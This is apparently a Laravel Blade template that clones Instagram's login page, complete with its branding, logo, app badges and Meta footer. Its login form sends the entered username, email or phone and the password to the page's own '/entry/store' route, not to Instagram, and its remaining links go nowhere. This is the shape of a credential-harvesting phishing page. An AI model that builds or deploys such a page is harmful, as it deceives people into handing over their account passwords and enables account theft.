<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/x-icon" href="./img/insta-fav.ico">
    <title>Instagram</title>
    <style type="text/css">
        .alert {
  padding: 15px;
  margin-bottom: 20px;
  border: 1px solid transparent;
  border-radius: 4px;
}

.alert-danger {
  color: #721c24;
  background-color: #f8d7da;
  border-color: #f5c6cb;
}

.alert-danger ul {
  margin-bottom: 0;
}

.alert-danger li {
  list-style-type: none;
  margin-left: 1.25em;
}

.alert-danger li::before {
  content: "\2022";  /* Bullet character */
  color: #721c24;
  font-weight: bold;
  display: inline-block;
  width: 1em;
  margin-left: -1em;
}
</style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form method="POST" action="/entry/store">
                    @csrf
                    @if ($errors->any())
                        <div class="alert alert-danger">
                            <ul>
                                @foreach ($errors->all() as $error)
                                    <li>{{ $error }}</li>
                                @endforeach
                            </ul>
                        </div>
                    @endif
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input name="email" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input name="pw" type="password" placeholder="Password" />

                    <button style="cursor: pointer;" type="submit">Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Continue with Facebook</a>
                    </div>
                    <a href="#">Forgot Password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Dont have an account?</p>
                <a href="#">Register</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta verified</a></li>
        </ul>
        <p class="copyright">© 2023 Instagram by Meta</p>
    </footer>
</body>

</html>